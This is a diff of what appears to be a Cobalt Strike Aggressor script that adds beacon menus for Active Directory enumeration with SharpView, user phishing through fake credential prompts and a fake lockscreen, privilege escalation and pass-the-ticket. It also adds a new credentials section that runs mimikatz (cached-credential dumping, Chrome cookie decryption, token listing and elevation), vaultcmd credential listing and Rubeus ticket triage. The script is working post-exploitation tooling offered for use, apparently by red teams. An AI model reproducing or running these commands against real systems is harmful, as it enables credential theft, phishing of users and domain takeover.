@@ -1,28 +1,28 @@
-##########################
+####################################################
 
 ##Define the pop up menu name
 
 ##
 
-##########################
+####################################################
 
 
 
 popup beacon_top {
 
-	menu "Enumeration" {
+	menu "Extension Kit" {
 
 
 
 
 
-##########################
+####################################################
 
 ##List All Items in Pop Up Menu
 
 ##
 
-##########################
+####################################################
 
 
 
@@ -104,7 +104,7 @@ menu "Domain Group Enumeration"
 
 			
 
-############			
+##########################################################################################End of menu			
 
 }
 
@@ -132,6 +132,8 @@ menu "Domain User Enumeration"
 
 }
 
+
+##############################################################################End of Menu
 
 
 menu "Phishing Users"
@@ -178,6 +180,9 @@ menu "Phishing Users"
 
 }
 
+
+##############################################################################End of Menu
+
 menu "Privilege Escalation"
 
 {
@@ -205,6 +210,9 @@ menu "Privilege Escalation"
 
 
 }
+
+
+##############################################################################End of Menu
 
 
 menu "Domain Computer Object Enumeration"
@@ -236,6 +244,8 @@ menu "Domain Computer Object Enumeration"
 }
 
 
+##############################################################################End of Menu
+
 
 menu "Domain/Forest Enumeration"
 
@@ -264,6 +274,9 @@ menu "Domain/Forest Enumeration"
 }
 
 
+##############################################################################End of Menu
+
+
 
 menu "Trust"
 
@@ -274,6 +287,9 @@ menu "Trust"
 	
 
 }
+
+
+##############################################################################End of Menu
 
 
 menu "Pass The Ticket"
@@ -290,10 +306,117 @@ menu "Pass The Ticket"
 
 				}
 }
+
+
+##############################################################################End of Menu
+
+
+#################
+##
+##This section is dedicated to credential extraction and Kerberos goodies
+##
+##
+#################
+
 					
+menu "Credentials and Kerberos"
+
+{
+
+	
+
+########Triage Tickets##################
 
 					
 
+		item "List Current Kerberos Tickets AKA Triage"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					rubeustriage($bid);
+
+				}
+
+			}
+
+		item "List Cached Credentials AKA lsadump::cache"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					lsadumpcache($bid);
+
+				}
+
+			}
+			
+		item "Vaulted Cred AKA vaultcmd Windows Creds"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					windowsvaultcmd($bid);
+
+				}
+
+			}
+
+		item "Vaulted Cred AKA vaultcmd Web Creds"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					webvaultcmd($bid);
+
+				}
+
+			}
+			
+		item "Steal Chrome Creds AKA dpapi::chrome"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					dpapichrome($bid);
+
+				}
+
+			}
+			
+		item "List Tokens with Mimikatz"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					listtokens($bid);
+
+				}
+
+			}
+			
+
+		item "Elevate your token with mimikatz"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					elevatetoken($bid);
+
+				}
+
+			}			
+
+
+
+}
 
 
 	
@@ -325,6 +448,13 @@ menu "Pass The Ticket"
   
 
 
+##############################################################################End of All Menus
+
+
+
+
+####################################################Begin Defining Variables for functions
+
 
 
 
@@ -338,6 +468,104 @@ menu "Pass The Ticket"
 
 
 
+########################### Elevate Token with Mimikatz
+
+sub elevatetoken{
+
+
+
+bmimikatz($1, "token::elevate");
+
+
+
+}
+
+
+
+########################### Mimikats Steal Tokens
+
+
+
+sub listtokens{
+
+
+
+bmimikatz($1, "token::list");
+
+
+
+}
+
+
+
+##########################Steal Chrome Creds
+
+sub dpapichrome{
+
+
+
+bmimikatz($1, "dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies");
+
+
+}
+
+
+##########################Steal Web Credentials from Vault
+
+sub webvaultcmd{
+
+
+
+brun($1, 'vaultcmd.exe /listcreds:"Web Credentials" /all');
+
+
+
+}
+
+
+##########################Steal Windows Credentials from Vault
+
+
+sub windowsvaultcmd{
+
+
+
+brun($1, 'vaultcmd.exe /listcreds:"Windows Credentials" /all');
+
+
+
+}
+
+
+##########################Mimikatz steal cached credentials
+
+sub lsadumpcache{
+
+
+
+bmimikatz($1, "lsadump::cache");
+
+
+
+}
+
+
+##########################Use Rubeus to Triage Kerberos Tickets
+
+sub rubeustriage{
+
+
+
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "triage");
+
+
+
+}
+
+
+
+########################## SharpView get current domain's SID
+
 sub getdomainsid{
 
 
@@ -347,6 +575,9 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainSID");
 
 
 }
+
+
+########################## SharpView Get Domain Computers
 
 
 
@@ -362,6 +593,8 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainComputer
 
 
 
+########################## SharpView List Admin Users
+
 sub getnetuseradmin{
 
 
@@ -371,6 +604,10 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetUser -Admin
 
 
 }
+
+
+
+########################## SharpView list Enterprise Admins
 
 
 
@@ -386,6 +623,10 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Iden
 
 
 
+########################## SharpView list Domain Admins
+
+
+
 sub getnetgroupdomainadmin{
 
 
@@ -395,6 +636,9 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Iden
 
 
 }
+
+
+########################## SharpView list Schema Admins
 
 
 
@@ -407,6 +651,9 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Iden
 
 
 }
+
+
+########################## SharpView list account operators
 
 
 
@@ -422,6 +669,9 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Iden
 
 
 
+########################## SharpView list Administrators group
+
+
 sub getnetgroupadministrator{
 
 
@@ -433,6 +683,8 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Iden
 }
 
 
+
+########################## Phish Users with small pop up box
 
 sub credphisher{
 
@@ -446,6 +698,9 @@ bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_You
 
 
 
+########################## Phish Users with fake lockscreen
+
+
 sub lockscreen{
 
 
@@ -456,6 +711,9 @@ bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
 
 }
 
+
+########################## Run Watson to find missing patches
+
 sub escalateprivs{
 
 
@@ -465,6 +723,9 @@ bexecute_assembly($1, script_resource('/exe/Watson.exe'));
 
 
 }
+
+
+########################## Pass the ticket
 
 sub passticket{
  # beacon ID
